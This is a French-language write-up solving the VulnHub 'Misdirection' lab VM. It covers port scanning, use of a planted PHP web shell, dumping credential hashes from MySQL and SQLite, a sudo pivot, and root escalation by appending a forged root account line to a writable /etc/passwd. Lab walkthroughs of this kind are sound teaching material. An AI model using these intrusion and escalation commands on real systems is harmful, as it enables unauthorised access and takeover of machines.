---
title: "Solution du CTF Misdirection de VulnHub"
tags: [CTF,VulnHub]
---

[Misdirection](https://vulnhub.com/entry/misdirection-1,371/) est un CTF assez simple, mais qui contient quelques trolls, ce qui explique sans doute le nom du CTF.

On trouve une appli web en Python sur le port 80 et un serveur web plus standard sur le port 8080 :

```
Nmap scan report for 192.168.56.212
Host is up (0.00028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Rocket httpd 1.2.6 (Python 2.7.15rc1)
3306/tcp open  mysql   MySQL (unauthorized)
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-enum: 
|   /wordpress/: Blog
|   /wordpress/wp-login.php: Wordpress login page.
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /debug/: Potentially interesting folder
|   /development/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /help/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /manual/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
```

L'appli web Python est [GitHub - mdipierro/evote: A system for secure, trusted, and verifiable voting on the web](https://github.com/mdipierro/evote) et se base sur le framework `web2py`.

Je n'ai pas trouvé d'exploit sur `exploit-db` ni de mention de vulnérabilité sur le projet Github donc je me suis tourné vers le port 8080.

Le wordpress trouvé par `Nmap` est configuré pour une autre adresse IP, le rendant quasi inexploitable.

Enfin le dossier `/debug` correspond à [GitHub - flozz/p0wny-shell: Single-file PHP shell](https://github.com/flozz/p0wny-shell) et on peut exécuter des commandes en tant que `www-data`.

Une fois un shell plus interactif récupéré, j'ai d'abord fouillé dans le MySQL à l'aide des identifiants que j'ai trouvés dans le fichier de configuration de Wordpress :

```console
www-data@misdirection:/var/www/html/wordpress$ mysql -u blog -pabcdefghijklmnopqrstuv wp_myblog
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 33
Server version: 5.7.26-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email       | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$BC4vcMsqXqr/cc46cx.E1arnrBq1yU/ | admin         | admin@brexit.com |          | 2019-06-01 06:08:19 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

Le hash semblait costaud, j'ai donc larch l'affaire.

J'ai ensuite regardé dans le fichier de configuration `/home/brexit/web2py/applications/init/private/appconfig.ini` de l'appli de vote électronique.

Il était mention d'une base sqlite. Cette dernière contient un hash :

```console
$ sqlite3 storage.sqlite 
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .tables
auth_cas         auth_membership  ballot         
auth_event       auth_permission  election       
auth_group       auth_user        voter          
sqlite> select * from auth_user;
1|brexit|brexit|brexit@brexit.com|pbkdf2(1000,20,sha512)$b84155cf478dcabe$0b88e35739f7ec70bd553e759d00eb441b12bbfb||||T
```

Je ne suis pas parvenu à mettre en forme le hash pour le casser avec `JohnTheRipper` mais je n'en ai pas eu besoin, car j'ai pu me connecter simplement sur l'appli web avec l'email trouvé et le mot de passe `brexit`.

Sur l'appli je peux éditer le texte affiché dans les mails lors des votes, mais je ne suis pas parvenu à injecter du code Python via `STTI`.

C'est sans doute possible, mais la VM étant en host-only elle ne peut pas vraiment envoyer les mails...

Finalement je me suis rendu compte que l'utilisateur `www-data` pouvait obtenir un shell en tant que `brexit` :

```console
www-data@misdirection:/tmp$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (brexit) NOPASSWD: /bin/bash
```

On obtenait alors le premier flag.

```console
www-data@misdirection:/tmp$ sudo -u brexit /bin/bash
brexit@misdirection:/tmp$ cd
brexit@misdirection:~$ ls
start-vote.sh  user.txt  web2py
brexit@misdirection:~$ cat user.txt 
404b9193154be7fbbc56d7534cb26339
```

Je n'ai rien remarqué de sensible lié à l'UID de l'utilisateur, mais en cherchant les fichiers liés au groupe `brexit` c'est plus intéressant :

```console
brexit@misdirection:~$ find / -group brexit -ls 2> /dev/null | grep -v /proc | grep -v /home
   136180      4 -rw-rw-r--   1 root     brexit       1648 May 22 09:01 /etc/passwd
   153237      4 -rw-rw-r--   1 root     brexit       1617 Jun  1  2019 /etc/passwd-
```

Je peux donc rajouter une ligne à `/etc/passwd` pour créer un compte privilégié.

```console
brexit@misdirection:~$ echo hax0r:ueqwOCnSGdsuM:0:0::/root:/bin/sh >> /etc/passwd
brexit@misdirection:~$ su hax0r
Password: 
# cd /root
# ls
root.txt
# cat root.txt
0d2c6222bfdd3701e0fa12a9a9dc9c8c
```

Une autre solution serait d'utiliser le fait que l'utilisateur fasse partie du groupe LXD (voir [lxd/lxc Group - Privilege escalation - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)).
